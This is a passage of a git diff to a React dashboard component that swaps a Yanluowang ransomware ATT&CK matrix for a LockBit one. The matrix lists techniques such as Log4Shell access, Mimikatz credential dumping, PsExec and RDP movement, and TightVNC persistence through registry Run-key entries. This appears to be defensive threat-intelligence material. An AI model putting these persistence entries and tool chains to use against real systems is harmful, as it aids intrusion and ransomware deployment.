@@ -4,7 +4,7 @@ type Propx = {
   className: string
 }
 
-const Yanluowang: React.FC<Propx> = ({className}) => { 
+const Lockbit: React.FC<Propx> = ({className}) => { 
   return (
 	<>
     <div className={`card mb-6 ${className}`}>
@@ -15,10 +15,14 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
             <thead>
 			   <tr className='fs-6 fw-semebold text-white bg-dark text-center'>
 			    	<th className='min-w-175px border-end border-white'>Initial-Access</th>
+			    	<th className='min-w-175px border-end border-white'>Execution</th>
 			    	<th className='min-w-175px border-end border-white'>Persistence</th>
+			    	<th className='min-w-175px border-end border-white'>Privilege-Escalation</th>
 			    	<th className='min-w-175px border-end border-white'>Defense-Evasion</th>
 			    	<th className='min-w-175px border-end border-white'>Credential-Access</th>
 			    	<th className='min-w-175px border-end border-white'>Discovery</th>
+			    	<th className='min-w-175px border-end border-white'>Lateral-Movement</th>
+			    	<th className='min-w-175px border-end border-white'>Collection</th>
 			    	<th className='min-w-175px border-end border-white'>Command-and-Control</th>
 			    	<th className='min-w-175px border-end border-white'>Exfiltration</th>
 			    	<th className='min-w-175px border-end border-white'>Impact</th>
@@ -29,12 +33,13 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1566</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Phishing</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1190</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>exploit public-facing application</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Bypass multi-level authentication using various techniques,</div>
+									<div>- log4shell
+</div>
 								</div>
 							</div>
 						</div>
@@ -43,12 +48,12 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1136.001</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Create Account: Local Account</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1059.001</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Command and Scripting Interpreter: PowerShell</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Add customized backdoor accounts</div>
+									<div>Evidence of PowerShell across multiple servers</div>
 								</div>
 							</div>
 						</div>
@@ -57,12 +62,40 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1070.001</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Indicator Removal on Host: Clear Windows Event Logs</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1547</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Boot or logon autostart execution</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>wevtutil.exe</div>
+									<div>Implementing the server to persistence</div>
+								</div>
+							</div>
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1078</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Valid Accounts</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Lockbit using accounts before use</div>
+								</div>
+							</div>
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1070.004</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Indicator Removal: File Deletion</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Indicator removal via file deletion.</div>
 								</div>
 							</div>
 						</div>
@@ -72,11 +105,11 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
 								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1003.001</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>OS Credential Dumping: LSASS Memory</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>OS credential dumping: LSASS Memory</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Using MiniDump</div>
+									<div>Using Mimikatz to dump LSASS Memory</div>
 								</div>
 							</div>
 						</div>
@@ -85,12 +118,12 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1012</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Query Registry</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1046</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Network Service Discovery</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Attempting to extract registry information</div>
+									<div>Usinig Port Scanner software to find network service</div>
 								</div>
 							</div>
 						</div>
@@ -99,12 +132,12 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1071.001</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Application Layer Protocol: Web Protocols</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1021.001</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Remote Desktop Protocol</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Communicates with the C2 server via HTTP GET requests</div>
+									<div>Using RDP to move the environment</div>
 								</div>
 							</div>
 						</div>
@@ -113,101 +146,12 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1048</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Exfiltration Over Alternative Protocol</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1560</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Archive Collected Data</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Attempt to leak information from the target environment</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1486</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Data Encrypted for Impact</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>- Sosemanuk
-- RSA-1024
-- RC4
-- .yanluowang
-</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				</tr>
-				<tr className=''>				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1078</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Valid Accounts</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Initial access to the Cisco VPN was gained by compromising a Cisco employee's personal Google account</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1098.005</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Account Manipulation: Device Registration</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Create an admin user called "z"</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1562.004</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Impair Defenses: Disable or Modify System Firewall</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Move files between systems within the environment</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1003.002</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>OS Credential Dumping: Security Account Manager</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Extract registry information</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1083</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>File and Directory Discovery</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Use the built-in Windows utility</div>
+									<div>Using Zips to collect data</div>
 								</div>
 							</div>
 						</div>
@@ -221,7 +165,74 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Install additional remote access tools</div>
+									<div>Using TightVNC as C2</div>
+								</div>
+							</div>
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1573</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Encrypted Channel</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Using encrypted channel to exfiltrate data</div>
+								</div>
+							</div>
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1531</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Account Access Removal</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Delete the accounts</div>
+								</div>
+							</div>
+						</div>
+					</td>          
+				</tr>
+				<tr className=''>				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1059.003</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Command and Scripting Interpreter: Windows Command Shelll</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Evidence of PSExec across multiple servers</div>
+								</div>
+							</div>
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1136 </span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Create Account</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Local account creation</div>
 								</div>
 							</div>
 						</div>
@@ -244,6 +255,91 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 								<span className='text-dark fw-semibold mb-1 fs-7'></span>
 							</div>
 							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1021.002</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Remote Services: SMB/Windows Admin Shares</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Using PsExec to move the environment</div>
+								</div>
+							</div>
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1041</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Exfiltration Over C2 Channel</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Using encrypted channel to exfiltrate data</div>
+								</div>
+							</div>
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1486</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Data Encrypted for Impact</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>- AES
+- RSA
+- .(random string)
+</div>
+								</div>
+							</div>
 						</div>
 					</td>          
 				</tr>
@@ -271,115 +367,12 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 					<td className='align-items-baseline border-start border-end border-dark'>
 						<div className='px-2 d-flex flex-column'>
 							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1112</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Modify Registry</span>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1133 </span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>External Remote Services</span>
 							</div>
 							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
 								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Leverage Windows logon bypass technique</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1003.003</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>OS Credential Dumping: NTDS</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>ntdsutil.exe</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1573.002</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Encrypted Channel: Asymmetric Cryptography</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Following the initial request from the infected system</div>
-								</div>
-							</div>
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				</tr>
-				<tr className=''>				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
-								<span className='text-dark fw-semibold mb-1 fs-7'></span>
-							</div>
-							
-						</div>
-					</td>          
-				
-					<td className='align-items-baseline border-start border-end border-dark'>
-						<div className='px-2 d-flex flex-column'>
-							<div className='symbol symbol-50px pb-1'>
-								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1621</span>
-								<span className='text-dark fw-semibold mb-1 fs-7'>Multi-Factor Authentication Request Generation</span>
-							</div>
-							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
-								<div className='text-white fw-semibold d-block fs-7'>
-									<div>Registered a series of new device for MFA</div>
+									<div>Lockbit use temporary servers</div>
 								</div>
 							</div>
 						</div>
@@ -412,6 +405,60 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 								<span className='text-dark fw-semibold mb-1 fs-7'></span>
 							</div>
 							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'></span>
+								<span className='text-dark fw-semibold mb-1 fs-7'></span>
+							</div>
+							
+						</div>
+					</td>          
+				
+					<td className='align-items-baseline border-start border-end border-dark'>
+						<div className='px-2 d-flex flex-column'>
+							<div className='symbol symbol-50px pb-1'>
+								<span className='badge badge-dark text-white fs-8 fw-bold me-2'>T1048</span>
+								<span className='text-dark fw-semibold mb-1 fs-7'>Exfiltration Over Alternative Protocol</span>
+							</div>
+							<div className='bg-gray-500 border-start border-danger1 border-3 ps-4 pt-2 pb-1 pe-1 fst-italic'>
+								<div className='text-white fw-semibold d-block fs-7'>
+									<div>Using SSL/SFTP to transmit data</div>
+								</div>
+							</div>
 						</div>
 					</td>          
 				
@@ -436,12 +483,34 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1566</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Phishing</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1190</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- exploit public-facing application</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Attackers bypassed Multi-Level Authentication (MFA) using various techniques, including voice phishing (aka "Vishing") and fatigue from multi-level authentication iterations.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Log4Shell exploitation of internet-facing application</div>
+					<div className='fs-2 fw-bold pb-3'>Vulnerability</div>
+					<div className='fs-4 fw-semebold pb-5 ms-5 text-dark fst-italic'>
+						<div>&deg;&nbsp;log4shell</div>
+					</div>
+					
+					
+				</div>
+			</div>
+		</div>
+	</div>
+	<div className='fs-1 fw-bold text-dark pt-1 ps-3'>Execution</div>
+	<div className='row g-5 g-xl-8 pt-4'>
+		<div className='col-xl-6'>
+			<div className='card card-xl-stretch mb-xl-8'>
+				<div className='card-header align-items-center border-0 mt-4'>
+					<div className='symbol symbol-50px pb-1'>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1059.001</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Command and Scripting Interpreter: PowerShell</span>
+					</div>
+				</div>
+				<div className='card-body pt-3'>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Evidence of PowerShell across multiple servers</div>
 					
 					
 					
@@ -452,12 +521,12 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1078</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Valid Accounts</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1059.003</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Command and Scripting Interpreter: Windows Command Shelll</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Initial access to the Cisco VPN was achieved via the successful compromise of a Cisco employee’s personal Google account. The user had enabled password syncing via Google Chrome and had stored their Cisco credentials in their browser, enabling that information to synchronize to their Google account.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Evidence of PSExec across multiple servers</div>
 					
 					
 					
@@ -471,14 +540,30 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1136.001</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Create Account: Local Account</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1547</span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Boot or logon autostart execution</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>The user also added customized backdoor accounts and set up persistence mechanisms.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>TightVNC server was implemented on the compromised host as a startup item to maintain an active presence on the compromised device.</div>
 					
+					<div className='fs-2 fw-bold pb-3'>Command</div>
+					<div className='mb-5'>
+						<span className='badge badge-light-danger fs-7 fw-bold my-2'>windows</span>
+						<span>&nbsp;&nbsp;</span>
+						
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>psh</span>
+						<span>&nbsp;&nbsp;</span>
 					
+						<span className='badge badge-light-primary fs-7 fw-bold my-2'>pwsh</span>
+						<span>&nbsp;&nbsp;</span>
+					
+						<div className='fs-5 fw-semibold mt-2 mb-2 ms-5 text-dark fst-italic'>
+							<div>&deg;&nbsp;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Vmware User Process REG_SZ "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr;</div>
+							<div>&deg;&nbsp;tvncontrol REG_SZ "C:\Program Files\TightVNC\tvnserver.exe" -controlservice -slave;</div>
+							
+						</div>
+					</div>
 					
 				</div>
 			</div>
@@ -487,27 +572,79 @@ const Yanluowang: React.FC<Propx> = ({className}) => {
 			<div className='card card-xl-stretch mb-xl-8'>
 				<div className='card-header align-items-center border-0 mt-4'>
 					<div className='symbol symbol-50px pb-1'>
-						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1098.005</span>
-						<span className='text-dark fw-bold mb-1 fs-3'>- Account Manipulation: Device Registration</span>
+						<span className='badge badge-dark text-white fs-5 fw-bold me-1'>T1136 </span>
+						<span className='text-dark fw-bold mb-1 fs-3'>- Create Account</span>
 					</div>
 				</div>
 				<div className='card-body pt-3'>
-					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Consistent with activity we previously observed in other separate but similar attacks, the adversary created an administrative user called “z” on the system using the built-in Windows “net.exe” commands. This account was then added to the local Administrators group. We also observed instances where the threat actor changed the password of existing local user accounts to the same value shown below. Notably, we have observed the creation of the “z” account by this actor in previous engagements prior to the Russian invasion of Ukraine.</div>
+					<div className='text-gray-700 fs-4 mb-7 fst-italic'>Local account creation</div>
 					
 					<div className='fs-2 fw-bold pb-3'>Command</div>
